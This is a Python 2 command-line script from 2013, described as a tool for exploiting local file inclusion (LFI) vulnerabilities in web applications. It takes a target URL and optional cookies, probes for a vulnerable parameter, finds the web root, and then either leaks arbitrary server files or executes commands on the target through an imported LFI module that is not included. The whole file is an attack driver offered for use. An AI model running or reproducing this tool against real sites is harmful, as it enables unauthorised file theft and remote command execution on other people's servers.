#!/usr/bin/python

'''
@author : m_101
@year   : 2013
@desc   : script for exploiting LFI vulnerabilities
'''

import argparse
import sys

# custom module
from core.lfi import LFI

# argument parser
parser = argparse.ArgumentParser(description='Exploit LFI')
parser.add_argument('--url', '-u', nargs=1, type=str, help='URL to attack', required=True)
parser.add_argument('--action', '-a', nargs=1, default='read', help='exec or read (default)')
parser.add_argument('--option', '-o', nargs=1, type=str, help='Action argument', required=True)
parser.add_argument('--replace', '-r', nargs=1, default='PAYLOAD', help='string to replace')
parser.add_argument('--cookies', '-c', nargs=1, default='', help='Cookies')
args = parser.parse_args ()

attack = LFI (args.url[0], args.replace)
if args.cookies != '':
    attack.load_cookies (args.cookies[0])

print '[+] Checking vulnerability'
vuln_url = attack.find_vuln_param ()
if vuln_url == None:
    print '[-] Did not find any vulnerable param'
    exit (1)
print '[+] Found vulnerability, new URL : {0}'.format (vuln_url)
print '[+] Searching for root path'
root_path = attack.find_root ()
print 'root : {0}'.format (root_path)
if root_path:
    purl = vuln_url.replace (args.replace, root_path + args.replace)
else:
    purl = vuln_url
print '[+] New URL : {0}'.format (purl)

if args.action == 'exec' or args.action[0] == 'exec':
    # execute command
    results = attack.do_exec (args.option[0])
    # print result
    if len (results) == 0:
        print 'No result : Bad command or no permission?'
    else:
        for result in results:
            print result
else:
    # leak file
    results = attack.do_leak (args.option[0])
    # print results
    if len (results) == 0:
        print 'No result : Not vulnerable or no permission?'
    else:
        for result in results:
            print result

